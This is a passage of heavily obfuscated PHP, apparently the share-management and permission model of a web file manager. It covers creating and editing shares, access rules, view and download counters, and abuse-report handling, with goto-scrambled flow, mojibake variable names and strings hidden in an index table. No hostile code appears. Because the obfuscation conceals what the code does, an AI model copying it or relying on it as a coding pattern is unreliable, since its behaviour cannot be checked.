Model($C‡¤áîñ´[507])->eventShare($A’ÈÛ•‡à¨, $C‡¤áîñ´[2256]); } if ($Bñ¸ºÜ•éæ[$C‡¤áîñ´[448]] == $C‡¤áîñ´[83]) { Model($C‡¤áîñ´[507])->eventShare($A’ÈÛ•‡à¨, $C‡¤áîñ´[2257]); } return; } $Aè“Ì´ã’Ó = $this->getInfoByPath($A’ÈÛ•‡à¨); goto E¨Ş˜»âè¨; F×îØˆ‡¯Å: } private function _addShareData($f¾Š²Á±µ, $BİØíØŞßÈ = array()) { goto BŠøµÀ÷¶ˆ; C‹œÔ÷©¦Ö: if ($DµØ¾„Ÿ¤Š = $this->where($E‘¾¹ÇŒ²)->find()) { return $DµØ¾„Ÿ¤Š[$C»§²Ú ğ[441]]; } if ($f¾Š²Á±µ == 0) { $B¡‡œŠÄ¼» = array($C»§²Ú ğ[28] => get_path_this($BİØíØŞßÈ[$C»§²Ú ğ[75]])); } else { $B¡‡œŠÄ¼» = Model($C»§²Ú ğ[760])->sourceInfo($f¾Š²Á±µ); if (!$B¡‡œŠÄ¼») { return !1; } } if (!$BİØíØŞßÈ[$C»§²Ú ğ[1356]]) { $BİØíØŞßÈ[$C»§²Ú ğ[1356]] = $B¡‡œŠÄ¼»[$C»§²Ú ğ[28]]; } goto f–òÚÒïÆ“; BŠøµÀ÷¶ˆ: $C»§²Ú ğ =& $_SERVER[¬ˆÚÂ”Éğä]; $E‘¾¹ÇŒ² = array($C»§²Ú ğ[383] => $f¾Š²Á±µ, $C»§²Ú ğ[1441] => USER_ID); if ($f¾Š²Á±µ == 0) { $E‘¾¹ÇŒ² = array($C»§²Ú ğ[2261] => $BİØíØŞßÈ[$C»§²Ú ğ[1032]], $C»§²Ú ğ[1441] => USER_ID); } goto C‹œÔ÷©¦Ö; aÎ×­øä¯ù: return $DÏ’Ì ¥›±; goto eÑé·ƒåî®; f–òÚÒïÆ“: $eÌ¡ƒÈ…½ = array($C»§²Ú ğ[1441] => USER_ID, $C»§²Ú ğ[383] => $f¾Š²Á±µ, $C»§²Ú ğ[1356] => $C»§²Ú ğ[33], $C»§²Ú ğ[446] => 0, $C»§²Ú ğ[448] => 0, $C»§²Ú ğ[1032] => $C»§²Ú ğ[33], $C»§²Ú ğ[295] => $C»§²Ú ğ[33], $C»§²Ú ğ[814] => $C»§²Ú ğ[33], $C»§²Ú ğ[2262] => 0, $C»§²Ú ğ[2263] => 0, $C»§²Ú ğ[449] => 0, $C»§²Ú ğ[450] => $C»§²Ú ğ[33], $C»§²Ú ğ[443] => $C»§²Ú ğ[33]); $BËŞ›…¸Í± = explode($C»§²Ú ğ[47], $C»§²Ú ğ[2264]); foreach ($BËŞ›…¸Í± as $C½¨õîî˜Û) { if (!isset($BİØíØŞßÈ[$C½¨õîî˜Û])) { continue; } $eÌ¡ƒÈ…½[$C½¨õîî˜Û] = $BİØíØŞßÈ[$C½¨õîî˜Û]; } goto a­…ì…åØ; a­…ì…åØ: $DÏ’Ì ¥›± = $this->add($eÌ¡ƒÈ…½); $d‘„Ñˆîä´ = array($C»§²Ú ğ[443] => short_id($DÏ’Ì ¥›±)); $this->where(array($C»§²Ú ğ[440] => $DÏ’Ì ¥›±))->save($d‘„Ñˆîä´); goto aÎ×­øä¯ù; eÑé·ƒåî®: } private function _shareAuthSet($E©ÇœŒÀ„‰, $F¤ºí¥¡‚Œ) { goto f˜á®™­ñ; f˜á®™­ñ: $cñÓğ¶ğõñ =& $_SERVER[¬ˆÚÂ”Éğä]; if (!is_array($F¤ºí¥¡‚Œ)) { return !1; } $EÇ·“á•Ğç = Model($cñÓğ¶ğõñ[2265]); goto C¢´ÓÎŒº‡; f ãõ›‚: return $EÇ·“á•Ğç->addAll($bš°äŠÑŒÓ, array(), !0); goto eƒ«šé’µ; C¢´ÓÎŒº‡: $EÇ·“á•Ğç->where(array($cñÓğ¶ğõñ[441] => $E©ÇœŒÀ„‰))->delete(); $bš°äŠÑŒÓ = array(); foreach ($F¤ºí¥¡‚Œ as $Fµ„¾§êÆÜ) { $FÑì¢‹Ùíö = SourceModel::TYPE_USER; if ($Fµ„¾§êÆÜ[$cñÓğ¶ğõñ[371]] == SourceModel::TYPE_GROUP) { $FÑì¢‹Ùíö = SourceModel::TYPE_GROUP; } $E‹õ¾Õ†Ş¹ = array($cñÓğ¶ğõñ[441] => $E©ÇœŒÀ„‰, $cñÓğ¶ğõñ[371] => $FÑì¢‹Ùíö, $cñÓğ¶ğõñ[458] => intval($Fµ„¾§êÆÜ[$cñÓğ¶ğõñ[458]]), $cñÓğ¶ğõñ[2266] => 0, $cñÓğ¶ğõñ[2267] => -1); if ($Fµ„¾§êÆÜ[$cñÓğ¶ğõñ[2266]]) { $E‹õ¾Õ†Ş¹[$cñÓğ¶ğõñ[2266]] = $Fµ„¾§êÆÜ[$cñÓğ¶ğõñ[2266]]; } else { if ($Fµ„¾§êÆÜ[$cñÓğ¶ğõñ[2267]]) { $E‹õ¾Õ†Ş¹[$cñÓğ¶ğõñ[2267]] = $Fµ„¾§êÆÜ[$cñÓğ¶ğõñ[2267]]; } } $bš°äŠÑŒÓ[] = $E‹õ¾Õ†Ş¹; } goto f ãõ›‚; eƒ«šé’µ: } public function numViewAdd($a­Ê¾âÖà) { $Dô‡»îô²À =& $_SERVER[¬ˆÚÂ”Éğä]; $FË±›İÚšÁ = array($Dô‡»îô²À[440] => $a­Ê¾âÖà); $this->where($FË±›İÚšÁ)->setAdd($Dô‡»îô²À[2262]); } public function numDownloadAdd($b‘ÅâÀŞÆ‚) { $Eñ£óÂñíŠ =& $_SERVER[¬ˆÚÂ”Éğä]; $D˜à·ÏæÕ‚ = array($Eñ£óÂñíŠ[440] => $b‘ÅâÀŞÆ‚); $this->where($D˜à·ÏæÕ‚)->setAdd($Eñ£óÂñíŠ[2263]); } protected function shareEdit($D•íÑØâéÉ, $e¨ª—ê½ƒ) { goto EùÏö¿îŠĞ; Bæåºëâæ: $this->_checkLinkShare($e¨ª—ê½ƒ, $dÚäƒĞ¹Î); $f‹ØåĞÁæ = array(); $b÷ã³¢Ãê× = explode($D¬×ŞöœêÓ[47], $D¬×ŞöœêÓ[2268]); goto F»‚Ğ•…; EùÏö¿îŠĞ: $D¬×ŞöœêÓ =& $_SERVER[¬ˆÚÂ”Éğä]; $dÚäƒĞ¹Î = $this->getInfo($D•íÑØâéÉ); if (!$dÚäƒĞ¹Î) { return !1; } goto Bæåºëâæ; F»‚Ğ•…: foreach ($b÷ã³¢Ãê× as $câ„¢ì††ö) { if (!array_key_exists($câ„¢ì††ö, $e¨ª—ê½ƒ)) { continue; } $f‹ØåĞÁæ[$câ„¢ì††ö] = $e¨ª—ê½ƒ[$câ„¢ì††ö]; } $this->shareEventAdd($dÚäƒĞ¹Î[$D¬×ŞöœêÓ[369]], $e¨ª—ê½ƒ, $D¬×ŞöœêÓ[2088]); $this->where(array($D¬×ŞöœêÓ[440] => $D•íÑØâéÉ))->save($f‹ØåĞÁæ); goto b›¦­®¦; b›¦­®¦: if (isset($e¨ª—ê½ƒ[$D¬×ŞöœêÓ[2255]])) { $this->_shareAuthSet($D•íÑØâéÉ, $e¨ª—ê½ƒ[$D¬×ŞöœêÓ[2255]]); } return !0; goto b’Ë®…Ñ¼è; b’Ë®…Ñ¼è: } private function _checkLinkShare($aÂàÛ¨À—, $f¦›ÁÑœ¨) { goto BÖ“î–æ; BÖ“î–æ: $C”¼ÎÙÍƒ· =& $_SERVER[¬ˆÚÂ”Éğä]; if ($aÂàÛ¨À—[$C”¼ÎÙÍƒ·[446]] != $C”¼ÎÙÍƒ·[83]) { return; } $cÉ—ëìŒ Ê = $f¦›ÁÑœ¨[$C”¼ÎÙÍƒ·[391]][$C”¼ÎÙÍƒ·[369]]; goto F¦¦÷“‰êî; e¥çíÀØ™: $Bç•İ è×¸ = $this->shareFileMeta($a¾ÕŒÎÚ¡³[$C”¼ÎÙÍƒ·[419]]); if (isset($Bç•İ è×¸[$C”¼ÎÙÍƒ·[359]]) && $Bç•İ è×¸[$C”¼ÎÙÍƒ·[359]] == $C”¼ÎÙÍƒ·[83]) { show_json(LNG($C”¼ÎÙÍƒ·[2271]), !1); } goto CÂÌ­–˜¶ô; F¦¦÷“‰êî: if ($f¦›ÁÑœ¨[$C”¼ÎÙÍƒ·[391]][$C”¼ÎÙÍƒ·[29]] != $C”¼ÎÙÍƒ·[167]) { $c×ÍõŞõì = $this->_folderReport($cÉ—ëìŒ Ê); if (!$c×ÍõŞõì) { return; } show_json(LNG($C”¼ÎÙÍƒ·[2269]) . $C”¼ÎÙÍƒ·[2270] . $c×ÍõŞõì, !1); } $a¾ÕŒÎÚ¡³ = Model($C”¼ÎÙÍƒ·[760])->fileInfoGet($f¦›ÁÑœ¨[$C”¼ÎÙÍƒ·[391]][$C”¼ÎÙÍƒ·[369]]); if (!$a¾ÕŒÎÚ¡³) { return; } goto e¥çíÀØ™; CÂÌ­–˜¶ô: } private function _folderReport($B†œ‹¼Œš) { goto aâ¬ö‘•Ö˜; Aœº¼ºÓ¢ä: $D”¶ÈÈ³À° = array_to_keyvalue($e¤Ä‘Û­ù‹, $aš¯ÎÚİİ[33], $aš¯ÎÚİİ[28]); $D”¶ÈÈ³À°[] = $AöµŠÛã¢Ş[$aš¯ÎÚİİ[28]]; return implode($aš¯ÎÚİİ[8], $D”¶ÈÈ³À°); goto eã¨Ûè«ÅŸ; B˜Œ½ŒÏÍ: $B°«ö¨—Œğ = array($aš¯ÎÚİİ[419] => array($aš¯ÎÚİİ[7], $eåŠ×§…), $aš¯ÎÚİİ[461] => array($aš¯ÎÚİİ[759], "\x25{$CÄ‚ˆ¿æœä}\45"), $aš¯ÎÚİİ[397] => 0); $AöµŠÛã¢Ş = Model($aš¯ÎÚİİ[760])->where($B°«ö¨—Œğ)->field($aš¯ÎÚİİ[2273])->find(); if (!$AöµŠÛã¢Ş) { return !1; } goto cÒ†×â¢”; cÒ†×â¢”: $E“¸Ç¿ÎÁ‡ = substr($AöµŠÛã¢Ş[$aš¯ÎÚİİ[461]], strpos($AöµŠÛã¢Ş[$aš¯ÎÚİİ[461]], $CÄ‚ˆ¿æœä)); $B°«ö¨—Œğ = array($aš¯ÎÚİİ[369] => array($aš¯ÎÚİİ[7], trim($E“¸Ç¿ÎÁ‡, $aš¯ÎÚİİ[47]))); $e¤Ä‘Û­ù‹ = Model($aš¯ÎÚİİ[760])->where($B°«ö¨—Œğ)->field($aš¯ÎÚİİ[28])->select(); goto Aœº¼ºÓ¢ä; dİÏì¾“ø: if (!$eåŠ×§…) { return !1; } $eåŠ×§… = array_to_keyvalue($eåŠ×§…, $aš¯ÎÚİİ[33], $aš¯ÎÚİİ[419]); $CÄ‚ˆ¿æœä = $aš¯ÎÚİİ[47] . $B†œ‹¼Œš . $aš¯ÎÚİİ[47]; goto B˜Œ½ŒÏÍ; aâ¬ö‘•Ö˜: $aš¯ÎÚİİ =& $_SERVER[¬ˆÚÂ”Éğä]; $B°«ö¨—Œğ = array($aš¯ÎÚİİ[419] => array($aš¯ÎÚİİ[938], 0), $aš¯ÎÚİİ[697] => 3); $eåŠ×§… = Model($aš¯ÎÚİİ[2272])->where($B°«ö¨—Œğ)->field($aš¯ÎÚİİ[419])->select(); goto dİÏì¾“ø; eã¨Ûè«ÅŸ: } protected function remove($Fà«ê­£™È) { goto D…Áœ£ªÛ; dë¯Ò³µ¶: for ($DÃÓÙ÷³®í = 0; $DÃÓÙ÷³®í < count($eµ¯¤ÙáŒˆ); $DÃÓÙ÷³®í++) { $c…Ø‘–Ôóí = $this->getInfo($eµ¯¤ÙáŒˆ[$DÃÓÙ÷³®í]); if ($c…Ø‘–Ôóí[$a»İï¹…†«[448]] == $a»İï¹…†«[83]) { Model($a»İï¹…†«[507])->eventShare($c…Ø‘–Ôóí[$a»İï¹…†«[369]], $a»İï¹…†«[2260]); } if ($c…Ø‘–Ôóí[$a»İï¹…†«[446]] == $a»İï¹…†«[83]) { Model($a»İï¹…†«[507])->eventShare($c…Ø‘–Ôóí[$a»İï¹…†«[369]], $a»İï¹…†«[2259]); } } return $BÛè£ÎØÎã; goto fÓß²©²Â; Aßƒæ‹¦µ: $BÛè£ÎØÎã = $this->where($A•‚êìÔê)->delete(); if ($BÛè£ÎØÎã) { Model($a»İï¹…†«[539])->where(array($a»İï¹…†«[441] => $Fà«ê­£™È))->delete(); } $eµ¯¤ÙáŒˆ = is_array($Fà«ê­£™È) ? $Fà«ê­£™È[1] : array($Fà«ê­£™È); goto dë¯Ò³µ¶; D…Áœ£ªÛ: $a»İï¹…†« =& $_SERVER[¬ˆÚÂ”Éğä]; if (is_array($Fà«ê­£™È)) { $Fà«ê­£™È = array($a»İï¹…†«[7], $Fà«ê­£™È); } $A•‚êìÔê = array($a»İï¹…†«[441] => $Fà«ê­£™È); goto Aßƒæ‹¦µ; fÓß²©²Â: } protected function removeBySource($C†÷ªê–•­) { goto fÏâ‘šÕÑ•; cØğÓ‡¾ƒ–: $fÏé”Š‡ = array_to_keyvalue($fÏé”Š‡, $CŸŠ„ ŠË[33], $CŸŠ„ ŠË[441]); if (!$fÏé”Š‡) { return; } $cÏÄ™‘Àä = array($CŸŠ„ ŠË[440] => array($CŸŠ„ ŠË[384], $fÏé”Š‡)); goto EîÊ¸‚À¹ó; fÏâ‘šÕÑ•: $CŸŠ„ ŠË =& $_SERVER[¬ˆÚÂ”Éğä]; $cÏÄ™‘Àä = array($CŸŠ„ ŠË[383] => array($CŸŠ„ ŠË[384], $C†÷ªê–•­)); $fÏé”Š‡ = $this->field($CŸŠ„ ŠË[441])->where($cÏÄ™‘Àä)->select(); goto cØğÓ‡¾ƒ–; EîÊ¸‚À¹ó: $this->where($cÏÄ™‘Àä)->delete(); Model($CŸŠ„ ŠË[539])->where($cÏÄ™‘Àä)->delete(); goto b¾÷ë­ï; b¾÷ë­ï: } public function listAll($BÕ¬ÎÂÏÚ) { goto cß—¿ÜŞ©Õ; cß—¿ÜŞ©Õ: $AåäŠ××”² =& $_SERVER[¬ˆÚÂ”Éğä]; $CïƒÄ¦ÖÒÃ = array(); if ($BÕ¬ÎÂÏÚ[$AåäŠ××”²[1450]]) { $CïƒÄ¦ÖÒÃ[$AåäŠ××”²[1450]] = $BÕ¬ÎÂÏÚ[$AåäŠ××”²[1450]]; } goto aÜ×ÀÓ—¦‘; Cªˆ¿É²ß: $DŸ¸ÆËò½’ = $this->_makeOrder()->where($CïƒÄ¦ÖÒÃ)->selectPage(20); if (empty($DŸ¸ÆËò½’[$AåäŠ××”²[354]])) { return array(); } $this->_listDataApply($DŸ¸ÆËò½’[$AåäŠ××”²[354]]); goto Eğ†ì®…ì; Eğ†ì®…ì: return $DŸ¸ÆËò½’; goto E†â…‹Âº; aÜ×ÀÓ—¦‘: if ($BÕ¬ÎÂÏÚ[$AåäŠ××”²[710]]) { $d¨¾¹ß†æŸ = $BÕ¬ÎÂÏÚ[$AåäŠ××”²[449]] ? $BÕ¬ÎÂÏÚ[$AåäŠ××”²[449]] : strtotime(date($AåäŠ××”²[2274])); $CïƒÄ¦ÖÒÃ[$AåäŠ××”²[187]] = array($AåäŠ××”²[321], array($BÕ¬ÎÂÏÚ[$AåäŠ××”²[710]], $d¨¾¹ß†æŸ)); } if ($BÕ¬ÎÂÏÚ[$AåäŠ××”²[29]]) { $CïƒÄ¦ÖÒÃ[$BÕ¬ÎÂÏÚ[$AåäŠ××”²[29]]] = 1; } else { $CïƒÄ¦ÖÒÃ[] = array($AåäŠ××”²[446] => array($AåäŠ××”²[938], 0), $AåäŠ××”²[448] => array($AåäŠ××”²[938], 0), $AåäŠ××”²[2250] => $AåäŠ××”²[2206]); } if ($BÕ¬ÎÂÏÚ[$AåäŠ××”²[2202]]) { $CïƒÄ¦ÖÒÃ[] = array($AåäŠ××”²[443] => $BÕ¬ÎÂÏÚ[$AåäŠ××”²[2202]], $AåäŠ××”²[1356] => array($AåäŠ××”²[759], "\45{$BÕ¬ÎÂÏÚ[$AåäŠ××”²[2202]]}\x25"), $AåäŠ××”²[2250] => $AåäŠ××”²[2206]); } goto Cªˆ¿É²ß; E†â…‹Âº: } public function listDataApply($BªÑ¼„›‰) { $this->_listDataApply($BªÑ¼„›‰); return $BªÑ¼„›‰; } private function _listDataApply(&$EÜàÚæâ‰à) { goto eì‡“¬æ÷; Bßé„©¼•»: $d´ø«‘Œ»Â = array_to_keyvalue($EÜàÚæâ‰à, $f´éÈñ¬„˜[33], $f´éÈñ¬„˜[369]); $b¯×·¹Æ = Model($f´éÈñ¬„˜[760])->sourceListInfo($d´ø«‘Œ»Â, !0); foreach ($EÜàÚæâ‰à as &$eëËÈÁ¡ Å) { $c¢ñ¡“¡Ş = $eëËÈÁ¡ Å[$f´éÈñ¬„˜[1450]]; $eëËÈÁ¡ Å[$f´éÈñ¬„˜[2275]] = $DØšÓ–ãµ¨[$c¢ñ¡“¡Ş] ? $DØšÓ–ãµ¨[$c¢ñ¡“¡Ş] : !1; $cÄ‡¼˜® = $eëËÈÁ¡ Å[$f´éÈñ¬„˜[369]]; $eëËÈÁ¡ Å[$f´éÈñ¬„˜[391]] = $b¯×·¹Æ[$cÄ‡¼˜®] ? $b¯×·¹Æ[$cÄ‡¼˜®] : !1; } goto D Ïœ˜÷„Ş; eì‡“¬æ÷: $f´éÈñ¬„˜ =& $_SERVER[¬ˆÚÂ”Éğä]; $C‚ÂÊç´¨Ê = array_to_keyvalue($EÜàÚæâ‰à, $f´éÈñ¬„˜[33], $f´éÈñ¬„˜[1450]); $DØšÓ–ãµ¨ = Model($f´éÈñ¬„˜[479])->userListInfo(array_unique($C‚ÂÊç´¨Ê)); goto Bßé„©¼•»; D Ïœ˜÷„Ş: unset($eëËÈÁ¡ Å); goto fÙ—à“Ûñ; fÙ—à“Ûñ: } private function _makeOrder($eçù«Ïê–¹ = '') { goto AØÑ”Ş¿»Œ; AØÑ”Ş¿»Œ: $B­ëÛÁ‡ñ¾ =& $_SERVER[¬ˆÚÂ”Éğä]; $cùàæË°§– = array($B­ëÛÁ‡ñ¾[187], $B­ëÛÁ‡ñ¾[449], $B­ëÛÁ‡ñ¾[2262], $B­ëÛÁ‡ñ¾[2263]); $FììŸê©Ã = array($B­ëÛÁ‡ñ¾[402] => $B­ëÛÁ‡ñ¾[403], $B­ëÛÁ‡ñ¾[404] => $B­ëÛÁ‡ñ¾[405]); goto f‚œˆ•Ï†; EËÊìà§ï·: $eçù«Ïê–¹ = $eçù«Ïê–¹ . "{$dˆ÷¾òæ¨¢}\40{$dø‚Í˜éÕŠ}"; return $this->order($eçù«Ïê–¹); goto bñ•ë¢õ©; f‚œˆ•Ï†: $dˆ÷¾òæ¨¢ = Input::get($B­ëÛÁ‡ñ¾[407], $B­ëÛÁ‡ñ¾[7], $B­ëÛÁ‡ñ¾[389], $cùàæË°§–); $dø‚Í˜éÕŠ = Input::get($B­ëÛÁ‡ñ¾[408], $B­ëÛÁ‡ñ¾[7], $B­ëÛÁ‡ñ¾[2276], array($B­ëÛÁ‡ñ¾[2201], $B­ëÛÁ‡ñ¾[404])); $dø‚Í˜éÕŠ = $FììŸê©Ã[$dø‚Í˜éÕŠ]; goto EËÊìà§ï·; bñ•ë¢õ©: } public function reportAdd($e…ÂÄƒå…) { $d“ÇÉïô¶¥ =& $_SERVER[¬ˆÚÂ”Éğä]; $B‚šãÎÑ  = array($d“ÇÉïô¶¥[441] => $e…ÂÄƒå…[$d“ÇÉïô¶¥[441]], $d“ÇÉïô¶¥[1450] => USER_ID); if (Model($d“ÇÉïô¶¥[2272])->where($B‚šãÎÑ )->find()) { return !1; } $fÆòéÅó¦Ğ = array($d“ÇÉïô¶¥[441] => $e…ÂÄƒå…[$d“ÇÉïô¶¥[441]], $d“ÇÉïô¶¥[1356] => $e…ÂÄƒå…[$d“ÇÉïô¶¥[1356]], $d“ÇÉïô¶¥[369] => $e…ÂÄƒå…[$d“ÇÉïô¶¥[369]], $d“ÇÉïô¶¥[419] => $e…ÂÄƒå…[$d“ÇÉïô¶¥[419]], $d“ÇÉïô¶¥[1450] => USER_ID, $d“ÇÉïô¶¥[29] => $e…ÂÄƒå…[$d“ÇÉïô¶¥[29]], $d“ÇÉïô¶¥[405] => $e…ÂÄƒå…[$d“ÇÉïô¶¥[405]]); return Model($d“ÇÉïô¶¥[2272])->add($fÆòéÅó¦Ğ); } public function reportList($Aó¬å‘ê¬) { goto Fƒ‹½‡·ê; c¹¦™ŒìÆÉ: $a‚°±ÀĞÕ— = array($Dš·ÊÃÕŠ‡[402] => $Dš·ÊÃÕŠ‡[403], $Dš·ÊÃÕŠ‡[404] => $Dš·ÊÃÕŠ‡[405]); $CÅŒùæ”‚ø = $Dš·ÊÃÕŠ‡[2280] . $a‚°±ÀĞÕ—[$Aƒß­¥îÆ]; $C¯“¸ĞàŠë = Model($Dš·ÊÃÕŠ‡[2272])->where($bŠ´ƒÁéÑ)->order($CÅŒùæ”‚ø)->selectPage(20); goto FŒ¯âÇ¾â; Fƒ‹½‡·ê: $Dš·ÊÃÕŠ‡ =& $_SERVER[¬ˆÚÂ”Éğä]; $bŠ´ƒÁéÑ = array(); if ($Aó¬å‘ê¬[$Dš·ÊÃÕŠ‡[710]]) { $c•çÕåí = $Aó¬å‘ê¬[$Dš·ÊÃÕŠ‡[449]] ? $Aó¬å‘ê¬[$Dš·ÊÃÕŠ‡[449]] : strtotime(date($Dš·ÊÃÕŠ‡[2274])); $bŠ´ƒÁéÑ[$Dš·ÊÃÕŠ‡[187]] = array($Dš·ÊÃÕŠ‡[321], array($Aó¬å‘ê¬[$Dš·ÊÃÕŠ‡[710]], $c•çÕåí)); } goto FÔ‚„×ñã; FŒ¯âÇ¾â: if (empty($C¯“¸ĞàŠë[$Dš·ÊÃÕŠ‡[354]])) { return array(); } $this->_listDataApply($C¯“¸ĞàŠë[$Dš·ÊÃÕŠ‡[354]]); return $C¯“¸ĞàŠë; goto Cåöø±Ç×©; FÔ‚„×ñã: if (isset($Aó¬å‘ê¬[$Dš·ÊÃÕŠ‡[29]]) && in_array($Aó¬å‘ê¬[$Dš·ÊÃÕŠ‡[29]], array($Dš·ÊÃÕŠ‡[83], $Dš·ÊÃÕŠ‡[2277], $Dš·ÊÃÕŠ‡[2278], $Dš·ÊÃÕŠ‡[2279], $Dš·ÊÃÕŠ‡[1936]))) { $bŠ´ƒÁéÑ[$Dš·ÊÃÕŠ‡[29]] = $Aó¬å‘ê¬[$Dš·ÊÃÕŠ‡[29]]; } if (isset($Aó¬å‘ê¬[$Dš·ÊÃÕŠ‡[697]]) && in_array($Aó¬å‘ê¬[$Dš·ÊÃÕŠ‡[697]], array($Dš·ÊÃÕŠ‡[470], $Dš·ÊÃÕŠ‡[83], $Dš·ÊÃÕŠ‡[2277], $Dš·ÊÃÕŠ‡[2278]))) { $bŠ´ƒÁéÑ[$Dš·ÊÃÕŠ‡[697]] = $Aó¬å‘ê¬[$Dš·ÊÃÕŠ‡[697]]; } $Aƒß­¥îÆ = Input::get($Dš·ÊÃÕŠ‡[408], $Dš·ÊÃÕŠ‡[7], $Dš·ÊÃÕŠ‡[2276], array($Dš·ÊÃÕŠ‡[2201], $Dš·ÊÃÕŠ‡[404])); goto c¹¦™ŒìÆÉ; Cåöø±Ç×©: } public function reportStatus($f«·éô¿‚Æ) { goto Eî†ß…êÈÔ; AÚ†¦°ÇÄ: if (!$FÆÆ¬å¦ø) { return !1; } $B¼Ê¼Ğíª = array($Dƒƒì½‘¸[697] => $f«·éô¿‚Æ[$Dƒƒì½‘¸[697]]); if ($f«·éô¿‚Æ[$Dƒƒì½‘¸[697]] == $Dƒƒì½‘¸[2278] && $FÆÆ¬å¦ø[$Dƒƒì½‘¸[697]] == $Dƒƒì½‘¸[2278]) { $B¼Ê¼Ğíª[$Dƒƒì½‘¸[697]] = 0; } goto bİèôê£­; E–¤øší¾: return $e×øé”º†; goto Bˆ‹…‡ĞÅù; Eî†ß…êÈÔ: $Dƒƒì½‘¸ =& $_SERVER[¬ˆÚÂ”Éğä]; $bîåêÒŒ—” = array($Dƒƒì½‘¸[367] => $f«·éô¿‚Æ[$Dƒƒì½‘¸[367]]); $FÆÆ¬å¦ø = Model($Dƒƒì½‘¸[2272])->where($bîåêÒŒ—”)->field($Dƒƒì½‘¸[2281])->find(); goto AÚ†¦°ÇÄ; bİèôê£­: $e×øé”º† = Model($Dƒƒì½‘¸[2272])->where($bîåêÒŒ—”)->save($B¼Ê¼Ğíª); if ($f«·éô¿‚Æ[$Dƒƒì½‘¸[697]] == $Dƒƒì½‘¸[2277]) { if ($FÆÆ¬å¦ø[$Dƒƒì½‘¸[419]] != $Dƒƒì½‘¸[470] && $this->shareFileMeta($FÆÆ¬å¦ø[$Dƒƒì½‘¸[419]])) { $this->shareFileMeta($FÆÆ¬å¦ø[$Dƒƒì½‘¸[419]], 0); } $this->remove($FÆÆ¬å¦ø[$Dƒƒì½‘¸[441]]); return !0; } if ($e×øé”º† && $f«·éô¿‚Æ[$Dƒƒì½‘¸[697]] == $Dƒƒì½‘¸[2278]) { $b‹£Ê°¼Ç = $B¼Ê¼Ğíª[$Dƒƒì½‘¸[697]] == $Dƒƒì½‘¸[2278] ? 1 : 0; $this->shareFileMeta($FÆÆ¬å¦ø[$Dƒƒì½‘¸[419]], $b‹£Ê°¼Ç); $this->removeByFile($FÆÆ¬å¦ø[$Dƒƒì½‘¸[419]]); } goto E–¤øší¾; Bˆ‹…‡ĞÅù: } private function removeByFile($A¿ã™÷ì Ñ) { goto Få¦¶„“ğß; FŠ£…ó½ƒÅ: $A®åà¨ƒœÔ = array_to_keyvalue($E”Š‹ó¸é¹, $CêãÕ–½²Ï[33], $CêãÕ–½²Ï[441]); $this->remove($A®åà¨ƒœÔ); goto fÔ‚ö÷§¥’; Få¦¶„“ğß: $CêãÕ–½²Ï =& $_SERVER[¬ˆÚÂ”Éğä]; $E”Š‹ó¸é¹ = Model($CêãÕ–½²Ï[760])->where(array($CêãÕ–½²Ï[419] => $A¿ã™÷ì Ñ))->field($CêãÕ–½²Ï[369])->select(); $dò©Çß‰ = array_to_keyvalue($E”Š‹ó¸é¹, $CêãÕ–½²Ï[33], $CêãÕ–½²Ï[369]); goto c‹©ì…âÍ; c‹©ì…âÍ: $aŒî¹èÎˆ = array($CêãÕ–½²Ï[369] => array($CêãÕ–½²Ï[7], $dò©Çß‰), $CêãÕ–½²Ï[446] => 1); $E”Š‹ó¸é¹ = Model($CêãÕ–½²Ï[2098])->where($aŒî¹èÎˆ)->field($CêãÕ–½²Ï[441])->select(); if (empty($E”Š‹ó¸é¹)) { return; } goto FŠ£…ó½ƒÅ; fÔ‚ö÷§¥’: } private function shareFileMeta($câ·äæŒæ, $fĞ¯öåËïŠ = null) { $A–Øß ½“× =& $_SERVER[¬ˆÚÂ”Éğä]; $a‚ğ˜ò¢ğ = array($A–Øß ½“×[419] => $câ·äæŒæ, $A–Øß ½“×[89] => $A–Øß ½“×[2282]); if (is_null($fĞ¯öåËïŠ)) { return Model($A–Øß ½“×[2283])->where($a‚ğ˜ò¢ğ)->find(); } $a‚ğ˜ò¢ğ[$A–Øß ½“×[359]] = $fĞ¯öåËïŠ; Model($A–Øß ½“×[2283])->add($a‚ğ˜ò¢ğ, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\x6f\137\x73\x6f\165\162\143\x65\x5f\x61\165\164\150"; public function getAuth($B­ìÌºÇºƒ) { goto FÜ¯İÇŒÖ; Cƒ÷™ ¢Õ: return $FÁ«£Äê¯°; goto e÷Á â‘öù; eª”°¬œÖ¯: $B¨‚ˆ¾¼® = 2 << 25; foreach ($c»¥šŒÊ¢ as $d¸Ö›¿ßä§) { goto e¦ÊÕäÛ; B½…ÚĞùèö: $Dñ†¨ŠŞˆ» = 0; if ($d¸Ö›¿ßä§[$aòÂêğ¹òÀ[371]] == SourceModel::TYPE_GROUP) { $Dñ†¨ŠŞˆ» = $B¨‚ˆ¾¼® * 2; } if ($d¸Ö›¿ßä§[$aòÂêğ¹òÀ[371]] == SourceModel::TYPE_USER) { $Dñ†¨ŠŞˆ» = $B¨‚ˆ¾¼®; } goto DôŸ©áï; e¦ÊÕäÛ: $A‰«ÂÀ‚’ = Model($aòÂêğ¹òÀ[2285])->listData($d¸Ö›¿ßä§[$aòÂêğ¹òÀ[2266]]); if (!$A‰«ÂÀ‚’) { continue; } $FÁ«£Äê¯°[] = $d¸Ö›¿ßä§; goto B½…ÚĞùèö; DôŸ©áï: if ($d¸Ö›¿ßä§[$aòÂêğ¹òÀ[371]] == SourceModel::TYPE_USER && $d¸Ö›¿ßä§[$aòÂêğ¹òÀ[458]] == $aòÂêğ¹òÀ[470]) { $Dñ†¨ŠŞˆ» = 0; } $BŠÖÚ¯®õŸ[] = $A‰«ÂÀ‚’[$aòÂêğ¹òÀ[376]] + $Dñ†¨ŠŞˆ»; goto A µ°¬“Ÿ; A µ°¬“Ÿ: } array_multisort($BŠÖÚ¯®õŸ, SORT_DESC, $FÁ«£Äê¯°); goto Cƒ÷™ ¢Õ; C÷¸«İ¸: $c»¥šŒÊ¢ = $this->field($d½²­¤ ‚…)->order($aòÂêğ¹òÀ[367])->where($cÁÀÀŸóÛÕ)->select(); $FÁ«£Äê¯° = array(); $BŠÖÚ¯®õŸ = array(); goto eª”°¬œÖ¯; FÜ¯İÇŒÖ: $aòÂêğ¹òÀ =& $_SERVER[¬ˆÚÂ”Éğä]; $d½²­¤ ‚… = $aòÂêğ¹òÀ[2284]; $cÁÀÀŸóÛÕ = array($aòÂêğ¹òÀ[369] => $B­ìÌºÇºƒ); goto C÷¸«İ¸; e÷Á â‘öù: } public function setAuth($D¸¼¨£ãô’, $A™Œ’¸áš) { goto 